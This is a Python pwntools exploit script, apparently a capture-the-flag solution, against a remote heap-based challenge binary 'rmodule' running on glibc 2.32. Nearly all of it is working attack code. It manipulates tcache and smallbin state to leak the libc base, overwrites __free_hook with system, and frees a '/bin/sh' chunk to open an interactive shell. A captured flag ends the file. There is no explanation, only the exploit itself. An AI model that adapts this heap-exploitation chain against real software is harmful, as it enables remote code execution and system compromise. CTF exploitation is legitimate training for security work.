from pwn import *

binary = ELF('./rmodule')
glibc_dir = '/home/xion/Desktop/GoN/glibc/2.32/'
libc = ELF(glibc_dir + 'libc-2.32.so')

IP, PORT = '3.35.105.237', 54321
DEBUG = False
#context.log_level = 'debug'
context.aslr = False
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if DEBUG:
    #p = process('./rmodule')
    p = process([glibc_dir + 'ld-2.32.so', './rmodule'], env={'LD_LIBRARY_PATH': glibc_dir})
else:
    p = remote(IP, PORT)

def cmd(s):
    p.recvuntil('> ')
    p.sendline(s)

def attack(s):
    cmd('ATTACK {}'.format(s))

def cancel(idx):
    cmd('CANCEL {}'.format(idx))
    return int(p.recvline(False), 16)

def message(sz, s):
    assert len(s) <= sz and '\n' not in s
    cmd('MESSAGE {} {}'.format(sz, s))

def target(x, y):
    cmd('TARGET {} {}'.format(x, y))

cmd('LOG ON')
for i in range(4):
    attack(str(i))
for i in range(4):
    attack_ptr = cancel(i)  # idx 0 ~ 3, where 3 is now faked

log.info('attack_ptr: {:016x}'.format(attack_ptr))

# stash fastbin -> smallbin
attack('A'*0x420)  # idx 4

# fill tcache
for i in range(5):
    target(1, 2)   # idx 5 ~ 9

unsorted_ptr = 0x1140 + attack_ptr + 1  # say no LSByte null
log.info('unsorted_ptr: {:016x}'.format(unsorted_ptr))

message(0x18, '')  # idx 10

attack('A'*0x420)  # idx 11

cmd('MODIFY 10 ' + p64(2) + p64(unsorted_ptr))

cmd('MODIFY 3')
p.recvuntil('Original attack method was ')
libc.address = u64('\0' + p.recv(5) + '\0\0') - 0x1e3c00
assert libc.address & 0xfff == 0
log.info('libc: {:016x}'.format(libc.address))

log.info('__free_hook: {:016x}'.format(libc.symbols['__free_hook']))
cmd('MODIFY 10 ' + p64(2) + p64(libc.symbols['__free_hook']))
assert '\0' not in p64(libc.symbols['system'])[:6] and '\n' not in p64(libc.symbols['system'])[:6]
cmd('MODIFY 3 ' + p64(libc.symbols['system'])[:6])

attack('/bin/sh;')  # idx 12

#gdb.attach(p)
#raw_input('yeet?')

cancel(12)

p.interactive()


### flag{58a2636970d659f682d62be05502e104cc6bc772ada7fe4045e8f830f59c134f} ###